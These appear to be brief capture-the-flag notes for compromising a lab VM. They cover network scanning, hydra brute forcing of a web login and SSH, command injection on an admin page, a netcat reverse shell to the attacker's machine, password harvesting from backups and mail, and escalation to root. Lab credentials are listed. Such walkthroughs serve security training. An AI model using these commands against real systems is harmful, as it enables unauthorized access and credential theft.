ifconfig

netdiscover -r <ip>.0/24 -i eth1

ping 192.168.56.105

nmap 192.168.56.105

22 and 80 open, so let's check out website - admin login page

BF it

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.105 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F

login: admin / happy

page runs commands, open inspector

change value of ls -l to see if we can inject our own linux CLI code (cd /home/; ls -l)

works + see info so let's make a reverse shell

in terminal: nc -lvp 4000

inject into site: nc 192.168.56.104 4000 -e /bin/sh

now have reverse shell of website on our terminal

cd /home/

cd jim

cd backups

cat old-passwords.bak (copy and paste save this on ur desktop)

open new terminal

hydra -l jim -P j

imsPW.txt 192.168.56.105 ssh

jim's ssh: jim / jibril04

ssh jim@192.168.56.105 (use password to login)

sudo su doesn't work, not in sudoer's file, so we need to change that

we got an email doing that. let's check it using

mail

if you don't see this, try cat mbox

here we see an email from charles and his password

charles / ^xHhA&hvim0y

so lets ssh as charles now

ssh charles@192.168.56.105 (use password to login

sudo su (use pw)

root access now

cd /root/

cat flag.txt
